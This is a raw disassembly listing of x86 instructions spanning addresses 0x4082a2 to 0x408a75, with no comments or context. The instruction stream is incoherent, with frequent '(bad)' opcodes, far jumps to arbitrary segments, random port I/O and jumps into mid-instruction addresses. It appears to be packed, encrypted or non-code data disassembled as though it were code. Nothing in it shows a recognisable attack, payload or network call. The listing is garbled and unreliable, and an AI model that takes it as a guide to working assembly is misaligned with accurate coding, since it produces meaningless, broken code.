  4082a2:	pop    eax
  4082a3:	pop    edx
  4082a4:	jmp    0x7a51:0xe2714fcf
  4082ab:	int3   
  4082ac:	jmp    DWORD PTR [ecx]
  4082ae:	jbe    0x408283
  4082b0:	shr    al,0x39
  4082b3:	into   
  4082b4:	xchg   ebp,eax
  4082b5:	and    ecx,ebp
  4082b7:	sbb    esp,edi
  4082b9:	not    BYTE PTR ds:0x2625cfc1
  4082bf:	add    BYTE PTR [edi-0x50],bl
  4082c2:	adc    BYTE PTR [edx+0x65],ch
  4082c5:	dec    edi
  4082c6:	imul   esi,DWORD PTR es:[edi+ebp*4+0x50f36030],0xffffff87
  4082cf:	loop   0x4082a2
  4082d1:	out    0x49,al
  4082d3:	xchg   esp,eax
  4082d4:	lahf   
  4082d5:	arpl   WORD PTR [edx],sp
  4082d7:	pop    ebx
  4082d8:	pop    esp
  4082d9:	out    0x99,eax
  4082db:	ins    BYTE PTR es:[edi],dx
  4082dc:	jle    0x408349
  4082de:	push   ecx
  4082df:	push   ebx
  4082e0:	dec    eax
  4082e1:	lds    edx,FWORD PTR ss:[esi+0x3ef9d545]
  4082e8:	xchg   ebx,eax
  4082e9:	pop    esi
  4082ea:	mov    esi,DWORD PTR [edx]
  4082ec:	(bad)  
  4082ee:	sub    eax,DWORD PTR [edi-0x77]
  4082f1:	sub    eax,0xb4045395
  4082f6:	mov    BYTE PTR [ecx+eiz*1+0x21d7ae5d],ah
  4082fd:	dec    esi
  4082fe:	mov    edx,0xfe163ed2
  408303:	pop    esp
  408304:	mov    eax,0x35ab46fd
  408309:	fnstsw WORD PTR [esp+edx*2+0x726d26d4]
  408310:	clc    
  408311:	aam    0x8
  408313:	(bad)  
  408314:	je     0x408377
  408316:	lea    esp,[ecx+0x4c64a162]
  40831c:	in     eax,dx
  40831d:	popf   
  40831e:	stos   DWORD PTR es:[edi],eax
  40831f:	push   es
  408320:	mov    ch,0x95
  408322:	xchg   esi,eax
  408323:	inc    ecx
  408324:	(bad)  
  408325:	loope  0x4082e6
  408327:	and    dh,BYTE PTR [esi-0xb86fe02]
  40832d:	cmp    BYTE PTR [eax+0x647c6a81],al
  408333:	adc    DWORD PTR [edi+0x26417adc],ebp
  408339:	pop    edi
  40833a:	mov    WORD PTR [ecx+0x310c992e],?
  408340:	mov    eax,0xa4a6693
  408345:	outs   dx,DWORD PTR ds:[esi]
  408346:	cmp    al,0xca
  408348:	sub    edi,DWORD PTR [ebp-0x29d900c2]
  40834e:	adc    ch,BYTE PTR [ebx]
  408350:	fld    TBYTE PTR [esi]
  408352:	sbb    edx,ebp
  408354:	push   ds
  408355:	pusha  
  408356:	cmp    BYTE PTR [edx+0x1b],0x4c
  40835a:	xor    al,0xbf
  40835c:	test   al,0x73
  40835e:	or     ebx,DWORD PTR [eax]
  408360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408361:	mov    ebp,DWORD PTR [ebx]
  408363:	test   BYTE PTR [ecx+0x13],cl
  408366:	dec    esi
  408367:	jmp    0x408311
  408369:	cwde   
  40836a:	mov    ebp,0xb0905f3a
  40836f:	xchg   esp,esp
  408371:	mov    gs,WORD PTR ds:0xa506eb68
  408377:	js     0x4083be
  408379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40837a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40837b:	aad    0xd6
  40837d:	and    ebp,DWORD PTR [esi+0x8]
  408380:	pop    ss
  408381:	inc    esp
  408382:	loope  0x408370
  408384:	inc    esi
  408385:	rcl    BYTE PTR [ebx+0x3f],0x33
  408389:	les    esi,FWORD PTR [edi+0x59e0864e]
  40838f:	aas    
  408390:	dec    ecx
  408391:	mov    bh,0xae
  408393:	push   ds
  408394:	arpl   WORD PTR [edx],bp
  408396:	mov    al,0x5e
  408398:	jo     0x408374
  40839a:	je     0x4083e7
  40839c:	sbb    ebp,DWORD PTR [esi-0x26]
  40839f:	retf   
  4083a0:	neg    ebp
  4083a2:	mov    esp,0x41996a63
  4083a7:	inc    edx
  4083a8:	arpl   WORD PTR [ebx+0x6bcabca2],dx
  4083ae:	retf   0x438b
  4083b1:	or     ecx,edi
  4083b3:	scas   al,BYTE PTR es:[edi]
  4083b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083b5:	cdq    
  4083b6:	xor    eax,0x6720d59e
  4083bb:	pop    es
  4083bc:	in     al,dx
  4083bd:	mov    ebp,0x9902990d
  4083c2:	jne    0x4083be
  4083c4:	mov    cl,dh
  4083c6:	adc    al,0xc9
  4083c8:	mov    ch,0x85
  4083ca:	ret    
  4083cb:	push   ebp
  4083cc:	test   eax,0xd3e1ad2a
  4083d1:	push   eax
  4083d2:	idiv   DWORD PTR [ebx+0x633e1cc1]
  4083d8:	pop    eax
  4083d9:	push   cs
  4083da:	les    edi,FWORD PTR [eax-0x16a98676]
  4083e0:	push   0xffffff84
  4083e2:	(bad)  
  4083e3:	int    0xe1
  4083e5:	ja     0x4083b6
  4083e7:	sub    al,0x9c
  4083e9:	xor    al,0x8f
  4083eb:	loop   0x40839d
  4083ed:	inc    edi
  4083ee:	lea    ecx,[edx+0x3c295fe3]
  4083f4:	mov    edi,esi
  4083f6:	repz loope 0x40844c
  4083f9:	ins    BYTE PTR es:[edi],dx
  4083fa:	jmp    0x1632c51a
  4083ff:	xchg   edi,eax
  408400:	sbb    eax,0x224cfffc
  408405:	sahf   
  408406:	or     BYTE PTR [eax-0x4a6a88f1],dh
  40840c:	test   BYTE PTR [esi-0x21568451],0x49
  408413:	test   al,0xaf
  408415:	sub    cl,bl
  408417:	mov    al,0xdc
  408419:	jo     0x408470
  40841b:	push   esi
  40841c:	mov    edi,0x3d857d9e
  408421:	jmp    0x408401
  408423:	inc    edx
  408424:	dec    edx
  408425:	shl    ebp,0xe8
  408428:	imul   edx,DWORD PTR [ebx+0x27],0xb6202297
  40842f:	loope  0x40842f
  408431:	sub    eax,0x48b2c46f
  408436:	rcl    DWORD PTR [ebx+0x492437b0],0xff
  40843d:	add    eax,0xc996b1db
  408442:	pop    edx
  408443:	and    edi,DWORD PTR [ebx-0x78c68070]
  408449:	adc    ebp,DWORD PTR [edx-0x41]
  40844c:	add    eax,DWORD PTR [edi]
  40844e:	xchg   edx,eax
  40844f:	lock jbe 0x408408
  408452:	(bad)  
  408453:	pop    esp
  408454:	jo     0x4084d1
  408456:	pusha  
  408457:	stos   DWORD PTR es:[edi],eax
  408458:	fcmovnbe st,st(5)
  40845a:	cmc    
  40845b:	shl    BYTE PTR [edx+esi*8+0x8],cl
  40845f:	pop    eax
  408460:	dec    ecx
  408461:	and    DWORD PTR [esi],0x6acc737
  408467:	mov    dh,0x81
  408469:	mov    ch,0xb3
  40846b:	jp     0x40846a
  40846d:	mov    al,0xbd
  40846f:	pop    edx
  408470:	mov    al,ds:0xf77b06b1
  408475:	jmp    0x408411
  408477:	int    0xc0
  408479:	sbb    eax,0x3f2da516
  40847e:	cwde   
  40847f:	jp     0x4084d5
  408481:	popa   
  408482:	cmp    eax,0xad042ade
  408487:	bound  edx,QWORD PTR [esi-0x42]
  40848a:	mov    ax,ds:0x677740fd
  408490:	ja     0x4084dc
  408492:	sti    
  408493:	fadd   QWORD PTR [ebx-0x3748f502]
  408499:	and    DWORD PTR [ebp+0x38cc042a],ebx
  40849f:	mov    eax,ds:0xd1fa0942
  4084a4:	mov    dl,BYTE PTR [edi-0x37e528d7]
  4084aa:	fld    DWORD PTR [eax]
  4084ac:	pcmpgtb mm1,QWORD PTR [ebx-0x8bf9cb1]
  4084b3:	call   0x10b5:0x1d01d1af
  4084ba:	jge    0x4084fa
  4084bc:	xchg   edi,eax
  4084bd:	or     WORD PTR [edi-0x79],0xc44
  4084c3:	shl    BYTE PTR [ebp-0x6a],1
  4084c6:	mov    BYTE PTR [ebx+0x59],bl
  4084c9:	push   0xe70243aa
  4084ce:	push   ebp
  4084cf:	fwait
  4084d0:	jo     0x408489
  4084d2:	and    bl,cl
  4084d4:	mov    WORD PTR [esi+0xd],ss
  4084d7:	mov    BYTE PTR [esi-0x3b13b93e],dh
  4084dd:	and    eax,0x95aec6a9
  4084e2:	loop   0x40854c
  4084e4:	or     bh,BYTE PTR [ecx]
  4084e6:	and    eax,ebx
  4084e8:	test   edx,ebp
  4084ea:	pusha  
  4084eb:	push   cs
  4084ec:	(bad)  
  4084ee:	xchg   DWORD PTR [ebx-0xd],ecx
  4084f1:	or     cl,bh
  4084f3:	fisttp DWORD PTR [ebx-0x24bf4d7b]
  4084f9:	out    dx,al
  4084fa:	xchg   ecx,eax
  4084fb:	pop    ds
  4084fc:	ins    BYTE PTR es:[edi],dx
  4084fd:	clc    
  4084fe:	mov    al,0xd1
  408500:	addr16 jmp 0x4084aa
  408503:	push   ebx
  408504:	leave  
  408505:	and    dl,al
  408507:	int    0x6b
  408509:	scas   eax,DWORD PTR es:[edi]
  40850a:	sahf   
  40850b:	out    dx,eax
  40850c:	xor    al,BYTE PTR [edx+0x32b9eb52]
  408512:	mov    ah,cl
  408514:	scas   eax,DWORD PTR es:[edi]
  408515:	mov    edi,0xb7444382
  40851a:	and    ebx,ebx
  40851c:	jno    0x408503
  40851e:	gs xchg ebx,eax
  408520:	sub    ebp,DWORD PTR [edx+ebx*1+0x16e50e5c]
  408527:	adc    BYTE PTR [esi-0x799a5892],bl
  40852d:	sub    DWORD PTR [edx],esi
  40852f:	rol    DWORD PTR [ebx],1
  408531:	xor    ah,BYTE PTR [esi-0x21ae721]
  408537:	enter  0x2be2,0x9
  40853b:	pop    ss
  40853c:	mov    edx,0xd7e8bb6e
  408541:	inc    edx
  408542:	cmp    al,ah
  408544:	push   eax
  408545:	fisttp DWORD PTR [ecx]
  408547:	lods   al,BYTE PTR ds:[esi]
  408548:	icebp  
  408549:	ss inc eax
  40854b:	rol    DWORD PTR [esi],cl
  40854d:	pop    esp
  40854e:	ins    BYTE PTR es:[edi],dx
  40854f:	pop    eax
  408550:	sub    bl,al
  408552:	out    dx,eax
  408553:	mov    eax,ds:0x7ab593e9
  408558:	std    
  408559:	sbb    edx,DWORD PTR [ecx+eax*1]
  40855c:	dec    esi
  40855d:	pop    esp
  40855e:	cmp    al,0xd8
  408560:	dec    edi
  408561:	pop    ds
  408562:	lods   al,BYTE PTR ds:[esi]
  408563:	push   ds
  408564:	hlt    
  408565:	mov    ds:0x9841df41,eax
  40856a:	daa    
  40856b:	pushf  
  40856c:	test   DWORD PTR [edi-0x6f],eax
  40856f:	xchg   esi,eax
  408570:	mov    edi,0xcdc9466d
  408575:	cmp    al,0xcb
  408577:	add    ch,BYTE PTR [edx-0x6388365b]
  40857d:	xor    edx,DWORD PTR [edx-0x73a18473]
  408583:	loop   0x40850a
  408585:	inc    edi
  408586:	in     al,0x6
  408588:	jge    0x4085a9
  40858a:	ja     0x408521
  40858c:	popf   
  40858d:	frstor [eax]
  40858f:	leave  
  408590:	aaa    
  408591:	xchg   BYTE PTR [ebx+0x78388a58],ah
  408597:	stos   DWORD PTR es:[edi],eax
  408598:	mov    ch,0x23
  40859a:	sbb    esi,DWORD PTR [ecx+eiz*1-0x266d755f]
  4085a1:	xor    al,BYTE PTR [ebx]
  4085a3:	pop    eax
  4085a4:	inc    ebx
  4085a5:	daa    
  4085a6:	dec    ecx
  4085a7:	mov    ah,0x3
  4085a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085aa:	or     esp,DWORD PTR [ecx+eax*4]
  4085ad:	dec    edi
  4085ae:	int    0x7e
  4085b0:	mov    edx,0x16aae6fe
  4085b5:	(bad)  
  4085b6:	dec    ebp
  4085b7:	cmp    DWORD PTR [edx+0x748c7373],0x709d8ba6
  4085c1:	(bad)  
  4085c2:	lock mov dl,0xd6
  4085c5:	inc    ecx
  4085c6:	out    dx,al
  4085c7:	into   
  4085c8:	es mov esp,0x7c3597ab
  4085ce:	lea    ecx,[ebp+0x5]
  4085d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085d2:	jae    0x40861a
  4085d4:	push   cs
  4085d5:	fld    st(5)
  4085d8:	inc    esp
  4085d9:	lahf   
  4085da:	xor    DWORD PTR [esi+ebp*1],0x3f
  4085de:	jmp    0x4ffc97d
  4085e3:	jae    0x4085ec
  4085e5:	pop    ebx
  4085e6:	pop    eax
  4085e7:	mov    gs,WORD PTR [edi]
  4085e9:	pop    ds
  4085ea:	xor    BYTE PTR [eax-0x243240e2],dh
  4085f0:	jnp    0x408594
  4085f2:	inc    ecx
  4085f3:	cmc    
  4085f4:	fcmovb st,st(5)
  4085f6:	and    DWORD PTR [ecx-0x50],ebx
  4085f9:	sahf   
  4085fa:	in     al,0x9b
  4085fc:	aad    0xe1
  4085fe:	sub    esp,DWORD PTR [ecx+0x2e]
  408601:	in     eax,dx
  408602:	nop
  408603:	dec    esp
  408604:	mov    eax,0x6a3b999
  408609:	arpl   WORD PTR [edx+0x72],bp
  40860c:	lock xchg BYTE PTR [esi+0x7a04a83e],al
  408613:	mov    dl,0x46
  408615:	and    dh,BYTE PTR [edi]
  408617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408618:	cld    
  408619:	xchg   ebp,eax
  40861a:	imul   esi,ebp,0x33
  40861d:	jno    0x408613
  40861f:	xchg   edx,eax
  408620:	push   edx
  408621:	or     BYTE PTR [eax-0x5e26021f],bh
  408627:	fcom   DWORD PTR [edi+0x20]
  40862a:	and    cl,cl
  40862c:	cmp    esi,DWORD PTR [ecx+eax*8+0x5e]
  408630:	xor    ecx,DWORD PTR [edi+0x7fb93f39]
  408636:	pushf  
  408637:	jp     0x4085e0
  408639:	dec    di
  40863b:	sub    eax,0x1d645c31
  408640:	inc    ebp
  408641:	sar    DWORD PTR ds:0x8feee3a3,cl
  408647:	sub    BYTE PTR [eax-0x72],bl
  40864a:	add    DWORD PTR [ebx-0x94f99ad],ebx
  408650:	inc    ecx
  408651:	push   ebp
  408652:	popf   
  408653:	inc    ecx
  408654:	dec    edx
  408655:	out    0x21,al
  408657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408658:	pop    es
  408659:	adc    eax,0x45292dd
  40865e:	test   DWORD PTR [ebp+0x30],edx
  408661:	pop    ebp
  408662:	outs   dx,DWORD PTR ds:[esi]
  408663:	xor    bh,al
  408665:	setns  BYTE PTR [edi+0x544f816e]
  40866c:	adc    edx,DWORD PTR es:[eax-0x46]
  408670:	fild   QWORD PTR [ebx+eax*2-0x1a]
  408674:	or     DWORD PTR [ebx+0x7c629261],ebp
  40867a:	nop
  40867b:	jnp    0x408634
  40867d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40867e:	out    0x1c,eax
  408680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408681:	stc    
  408682:	pushf  
  408683:	or     al,0x17
  408685:	inc    edi
  408686:	or     al,ch
  408688:	pop    edi
  408689:	lea    edi,[ecx-0x7a]
  40868c:	mov    eax,0x1846b3dd
  408691:	aaa    
  408692:	loopne 0x40863a
  408694:	pop    ds
  408695:	nop
  408696:	lock ds loop 0x4086c7
  40869a:	jg     0x40864c
  40869c:	imul   ebp,esi,0x18
  40869f:	popa   
  4086a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086a1:	xorps  xmm7,XMMWORD PTR [ebx+ebp*2+0x55]
  4086a6:	pop    ss
  4086a7:	out    dx,eax
  4086a8:	cmp    eax,0x1c4c7662
  4086ad:	call   0x895:0x64ad3d03
  4086b4:	push   edi
  4086b5:	cmp    bh,BYTE PTR [edi-0x32]
  4086b8:	inc    edi
  4086b9:	mov    al,0x99
  4086bb:	(bad)  
  4086bc:	(bad)  
  4086bd:	icebp  
  4086be:	pop    ds
  4086bf:	(bad)  
  4086c1:	pop    ecx
  4086c2:	mov    ah,0xe
  4086c4:	fldcw  WORD PTR [esi+0x7fbc2d5c]
  4086ca:	lods   eax,DWORD PTR ds:[esi]
  4086cb:	inc    esp
  4086cc:	jl     0x4086e5
  4086ce:	and    ebp,DWORD PTR [edi+0x7f03bee8]
  4086d4:	mov    fs,WORD PTR [edx+0x9]
  4086d7:	lock push edx
  4086d9:	leave  
  4086da:	xchg   esi,eax
  4086db:	mov    eax,ds:0x76234be6
  4086e0:	aad    0x73
  4086e2:	call   0x6220abd6
  4086e7:	jbe    0x40869b
  4086e9:	jbe    0x4086da
  4086eb:	adc    esp,ebx
  4086ed:	push   edx
  4086ee:	inc    ebp
  4086ef:	rep stos BYTE PTR es:[edi],al
  4086f1:	enter  0x9490,0x6d
  4086f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f6:	ret    0xefb2
  4086f9:	and    DWORD PTR [ecx-0x7fd90b82],eax
  4086ff:	add    ch,BYTE PTR ds:0x2c98163c
  408705:	retf   0x4742
  408708:	xchg   DWORD PTR [edx],ecx
  40870a:	xchg   edx,eax
  40870b:	cld    
  40870c:	pusha  
  40870d:	loope  0x40878b
  40870f:	fldenv [ecx+0x7d4f1119]
  408715:	test   DWORD PTR [ecx-0x44935d8a],ebp
  40871b:	push   0xffffff85
  40871d:	sub    eax,0x12af8e39
  408722:	test   al,0xb3
  408724:	mov    edx,0xe297dd88
  408729:	mov    ebx,DWORD PTR [eax]
  40872b:	(bad)  
  40872c:	cli    
  40872d:	mov    ds:0x35a0c8f7,al
  408732:	mov    edx,0x9e71557e
  408737:	fs mov edi,0x7c1900db
  40873d:	mov    cl,0x83
  40873f:	out    dx,eax
  408740:	lods   eax,DWORD PTR ds:[esi]
  408741:	push   esp
  408742:	cmp    ebx,DWORD PTR [eax]
  408744:	jo     0x40879b
  408746:	mov    ds,edi
  408748:	ja     0x4087b4
  40874a:	cmp    al,0x22
  40874c:	add    edi,DWORD PTR [ebx+0x23]
  40874f:	jmp    FWORD PTR [ebx+ebp*2-0x5b]
  408753:	inc    ebp
  408754:	pop    ss
  408755:	adc    al,0x74
  408757:	js     0x408709
  408759:	daa    
  40875a:	out    0x33,al
  40875c:	rol    esp,0x11
  40875f:	out    0xa2,eax
  408761:	inc    ebp
  408762:	idiv   esp
  408764:	xlat   BYTE PTR ds:[ebx]
  408765:	scas   eax,DWORD PTR es:[edi]
  408766:	dec    esi
  408767:	lock jge 0x4087d1
  40876a:	jl     0x408797
  40876c:	and    eax,0xb4433091
  408771:	lea    ebx,[esi+0x52]
  408774:	jmp    0xafff3d62
  408779:	fidivr WORD PTR [edi]
  40877b:	inc    ebx
  40877c:	movhps xmm1,QWORD PTR [eax-0x411eebaf]
  408783:	adc    eax,0x3aecfd39
  408788:	enter  0x1553,0x3b
  40878c:	pop    ecx
  40878d:	add    al,0x3b
  40878f:	shr    BYTE PTR [eax+0x10fc8fb3],cl
  408795:	aaa    
  408796:	mov    ds:0x6b49764f,eax
  40879b:	gs jnp 0x40877e
  40879e:	sbb    edi,DWORD PTR [esi+0x197af529]
  4087a4:	arpl   WORD PTR [ebx-0x7d008de3],ax
  4087aa:	mov    al,0x95
  4087ac:	(bad)  
  4087ad:	das    
  4087ae:	out    0xb2,eax
  4087b0:	adc    al,0xd
  4087b2:	xor    DWORD PTR [ebp+0x15],esi
  4087b5:	or     eax,0xb7d23461
  4087ba:	jecxz  0x40882c
  4087bc:	jle    0x4087a9
  4087be:	mov    ds:0x3f49af02,eax
  4087c3:	sbb    ch,BYTE PTR [edx-0x41]
  4087c6:	adc    eax,0x8ec86fe9
  4087cb:	bnd jb 0x4087c6
  4087ce:	cmp    eax,0xe10d9c18
  4087d3:	mov    bl,0xc2
  4087d5:	out    dx,eax
  4087d6:	xlat   BYTE PTR ds:[ebx]
  4087d7:	sub    DWORD PTR ds:0xb06322f8,esi
  4087dd:	jo     0x408795
  4087df:	scas   al,BYTE PTR es:[edi]
  4087e0:	stos   BYTE PTR es:[edi],al
  4087e1:	fsubr  QWORD PTR [ecx]
  4087e3:	push   es
  4087e4:	push   edi
  4087e5:	shl    dh,cl
  4087e7:	test   eax,0x8973d9f0
  4087ec:	or     ah,BYTE PTR [esi]
  4087ee:	xchg   ecx,eax
  4087ef:	add    DWORD PTR [edx+ecx*2+0x3e],esi
  4087f3:	cmp    DWORD PTR ds:0x4106fb12,ebx
  4087f9:	cld    
  4087fa:	hlt    
  4087fb:	aad    0xea
  4087fd:	imul   edx,DWORD PTR [ecx+0x3175afe6],0xfffffff8
  408804:	loop   0x4087c8
  408806:	bound  esp,QWORD PTR [edx]
  408808:	clc    
  408809:	sbb    eax,0x6f6bae3c
  40880e:	xchg   BYTE PTR [ebx],bh
  408810:	stos   DWORD PTR es:[edi],eax
  408811:	xor    DWORD PTR [esi-0x2598799f],ebx
  408817:	cmp    eax,DWORD PTR [esi+0x1c766d44]
  40881d:	jb     0x40881c
  40881f:	xor    DWORD PTR [edx-0x4],esp
  408822:	and    ecx,eax
  408824:	mov    ss,WORD PTR ds:0x45d2f4bf
  40882a:	jne    0x40882c
  40882c:	dec    eax
  40882d:	add    al,0xea
  40882f:	ja     0x408879
  408831:	mov    ebp,0x6b781d12
  408836:	std    
  408837:	retf   
  408838:	jl     0x4087d0
  40883a:	add    edi,ebp
  40883c:	int    0xc7
  40883e:	cli    
  40883f:	pop    ds
  408840:	mov    DWORD PTR [ebp-0x44554c42],esi
  408846:	cmc    
  408847:	js     0x4087e5
  408849:	xor    BYTE PTR [ebx],ch
  40884b:	imul   DWORD PTR [eax]
  40884d:	outs   dx,DWORD PTR ds:[esi]
  40884e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40884f:	pop    ebx
  408850:	jns    0x4088a5
  408852:	lahf   
  408853:	sbb    ch,BYTE PTR [ecx+edi*1-0x77365d16]
  40885a:	xlat   BYTE PTR ds:[ebx]
  40885b:	inc    ebp
  40885c:	leave  
  40885d:	and    ebp,ecx
  40885f:	test   al,0x9a
  408861:	or     esi,DWORD PTR [edx]
  408863:	ss jns 0x40886d
  408866:	or     al,0x16
  408868:	xor    edi,esi
  40886a:	mov    DWORD PTR [ebp-0x21361c69],ecx
  408870:	ret    0x36ee
  408873:	push   edi
  408874:	inc    eax
  408875:	jl     0x408875
  408877:	mov    al,0xb2
  408879:	add    al,0x13
  40887b:	push   es
  40887c:	sub    eax,DWORD PTR [edx+0x41]
  40887f:	shl    BYTE PTR [ecx],0xbf
  408882:	in     al,dx
  408883:	jo     0x408821
  408885:	(bad)  
  408886:	lods   eax,DWORD PTR ds:[esi]
  408887:	ins    DWORD PTR es:[edi],dx
  408888:	ja     0x40888a
  40888a:	or     al,BYTE PTR [ebp-0x5590a992]
  408890:	jg     0x40884d
  408892:	push   0x58
  408894:	add    al,0xd6
  408896:	rol    DWORD PTR es:[ebp+0x4010fcd6],1
  40889d:	cmp    dh,BYTE PTR [eax-0x1a]
  4088a0:	stos   BYTE PTR es:[edi],al
  4088a1:	lods   eax,DWORD PTR ds:[esi]
  4088a3:	adc    DWORD PTR [eax+ebp*4+0x3ff3a2ce],esp
  4088aa:	dec    ecx
  4088ab:	mov    bh,0xb2
  4088ad:	je     0x4088a3
  4088af:	pop    esi
  4088b0:	aad    0xeb
  4088b2:	test   BYTE PTR [ecx-0x25],bl
  4088b5:	push   ds
  4088b6:	iret   
  4088b7:	test   BYTE PTR [edi],bh
  4088b9:	inc    edx
  4088ba:	out    dx,eax
  4088bb:	popf   
  4088bc:	ss sub eax,0x3be4a0fd
  4088c2:	clc    
  4088c3:	or     DWORD PTR [eax],ebx
  4088c5:	cs pop esi
  4088c7:	pop    eax
  4088c8:	mov    bl,0x9a
  4088ca:	loop   0x40888e
  4088cc:	fistp  DWORD PTR [eax+0x47]
  4088cf:	add    DWORD PTR [ecx*8-0x3b22e157],ecx
  4088d6:	out    0xd1,eax
  4088d8:	jmp    0x408869
  4088da:	inc    esp
  4088db:	(bad)  
  4088dd:	jne    0x4088ca
  4088df:	scas   eax,DWORD PTR es:[edi]
  4088e0:	jno    0x4088cb
  4088e2:	jp     0x408925
  4088e4:	cmp    al,0xe0
  4088e6:	jle    0x4088a7
  4088e8:	stc    
  4088e9:	and    al,0x50
  4088eb:	outs   dx,DWORD PTR cs:[esi]
  4088ed:	xchg   edi,eax
  4088ee:	push   eax
  4088ef:	fwait
  4088f0:	or     dl,BYTE PTR [edi+0x404bf6d0]
  4088f6:	adc    eax,0x2bb51f80
  4088fb:	std    
  4088fc:	shl    DWORD PTR ds:0xa0a9675b,0x34
  408903:	xlat   BYTE PTR ds:[ebx]
  408904:	fbld   TBYTE PTR [eax+0x3d19ad94]
  40890a:	jmp    0x9f90:0xf7e5ec68
  408911:	mov    esp,eax
  408913:	dec    edi
  408914:	(bad)  
  408915:	stos   BYTE PTR es:[edi],al
  408916:	xchg   al,cl
  408918:	neg    eax
  40891a:	iret   
  40891b:	inc    edi
  40891c:	jmp    0x72b3259
  408921:	stos   BYTE PTR es:[edi],al
  408922:	(bad)  
  408924:	call   0xa1bf:0x10e8bf98
  40892b:	int3   
  40892c:	ja     0x408954
  40892e:	jns    0x408975
  408930:	sub    eax,0x52b5573e
  408935:	push   ds
  408936:	and    BYTE PTR [ecx+0x5bd70924],bh
  40893c:	jp     0x4089b4
  40893e:	xchg   BYTE PTR [ebp+eax*4-0x3a],ch
  408942:	push   ebp
  408943:	sbb    BYTE PTR [edx],cl
  408945:	hlt    
  408946:	xchg   esp,eax
  408947:	stos   BYTE PTR es:[edi],al
  408948:	leave  
  408949:	call   0x3d9e:0xe0e8ca7a
  408950:	jl     0x40891e
  408952:	dec    ebx
  408953:	sbb    dh,cl
  408955:	fdiv   QWORD PTR [esi+0xcfbdc3]
  40895b:	inc    edi
  40895c:	push   ds
  40895d:	mov    bl,0xe8
  40895f:	daa    
  408960:	xor    ebx,0xa27dc0b3
  408966:	mov    ds:0xc6a6ef2a,eax
  40896b:	out    dx,al
  40896c:	cmp    ah,BYTE PTR [ecx]
  40896e:	enter  0xd684,0x1e
  408972:	iret   
  408973:	jge    0x408943
  408975:	and    bh,ah
  408977:	popa   
  408978:	jg     0x4089f3
  40897a:	push   0xe8e27691
  40897f:	jmp    0x42a497f8
  408984:	js     0x4089d0
  408986:	pop    ss
  408987:	mov    eax,0x4bde5970
  40898c:	pop    ss
  40898d:	daa    
  40898e:	push   esp
  40898f:	inc    esi
  408990:	std    
  408991:	adc    BYTE PTR [esi-0xb3b93a8],ch
  408997:	xchg   edi,esi
  408999:	mov    ?,WORD PTR [ebp-0x1cc49365]
  40899f:	add    BYTE PTR [ebx],bl
  4089a1:	pop    es
  4089a2:	and    dl,ah
  4089a4:	and    BYTE PTR [eax+0x514a8105],al
  4089aa:	mov    ds:0xc92de129,eax
  4089af:	mov    cs,edx
  4089b1:	pop    edx
  4089b2:	xor    eax,0x60f86fa3
  4089b7:	arpl   WORD PTR [edx+0x3c692e47],cx
  4089bd:	xchg   ecx,eax
  4089be:	retf   
  4089bf:	in     eax,0x53
  4089c1:	pop    es
  4089c2:	lods   eax,DWORD PTR ds:[esi]
  4089c4:	jnp    0x40898e
  4089c6:	mov    al,ds:0x2b34f561
  4089cb:	sub    dh,al
  4089cd:	jle    0x40895f
  4089cf:	mov    bh,0xf3
  4089d1:	add    eax,0xbfe077e
  4089d6:	jnp    0x408a39
  4089d8:	pop    ebp
  4089d9:	xchg   esi,eax
  4089da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089db:	cmp    edx,DWORD PTR [eax+0x29]
  4089de:	rcr    BYTE PTR [eax+0x3f4a0f55],1
  4089e4:	cmp    eax,ecx
  4089e6:	dec    ecx
  4089e7:	jno    0x408986
  4089e9:	mov    es,WORD PTR [ecx+0x5ca1d50a]
  4089ef:	out    0xaa,eax
  4089f1:	out    0xad,al
  4089f3:	mov    BYTE PTR [eax+0x5b25790d],dl
  4089f9:	jb     0x4089d8
  4089fb:	inc    esp
  4089fc:	sbb    dl,BYTE PTR [edx]
  4089fe:	push   DWORD PTR [eax+0x3e]
  408a01:	data16 or BYTE PTR [esi+0x666d7f8c],0x9
  408a09:	daa    
  408a0a:	ins    DWORD PTR es:[edi],dx
  408a0b:	fistp  QWORD PTR [ecx+ecx*8-0x52f5526d]
  408a12:	and    al,0x9d
  408a14:	cmc    
  408a15:	xchg   edx,eax
  408a16:	lods   al,BYTE PTR ds:[esi]
  408a17:	into   
  408a18:	cdq    
  408a19:	or     edi,DWORD PTR [edx+0x1b]
  408a1c:	xchg   edi,eax
  408a1d:	fwait
  408a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a1f:	or     DWORD PTR [ebp+0x50],eax
  408a22:	push   0x34
  408a24:	mov    dh,BYTE PTR [edi+0x4e]
  408a27:	add    al,0xc1
  408a29:	(bad)  [ecx]
  408a2b:	xchg   esi,eax
  408a2c:	lds    edi,FWORD PTR [ebx-0x33aa8145]
  408a32:	sbb    DWORD PTR [ebx],eax
  408a34:	mov    esi,gs
  408a36:	pop    esp
  408a37:	cwde   
  408a38:	out    dx,al
  408a39:	rcl    DWORD PTR ds:0xc128ce31,cl
  408a3f:	inc    esp
  408a40:	sti    
  408a41:	out    dx,eax
  408a42:	mov    ebx,0x1e4094b1
  408a47:	sub    eax,0x9251161c
  408a4c:	mov    cs:0xaa3e6e9f,al
  408a52:	sub    ecx,DWORD PTR [ebx-0x15457477]
  408a58:	xchg   ebp,eax
  408a59:	sbb    al,0xc9
  408a5b:	jecxz  0x408a05
  408a5d:	dec    ecx
  408a5e:	pop    ebp
  408a5f:	dec    ecx
  408a60:	inc    edi
  408a61:	and    eax,0xffbb43c
  408a66:	mov    ch,0xe5
  408a68:	mov    esp,0xe62a3c7b
  408a6d:	inc    ecx
  408a6e:	jns    0x408a92
  408a70:	sbb    eax,0xa19a948f
  408a75:	lods   eax,DWORD PTR ds:[esi]
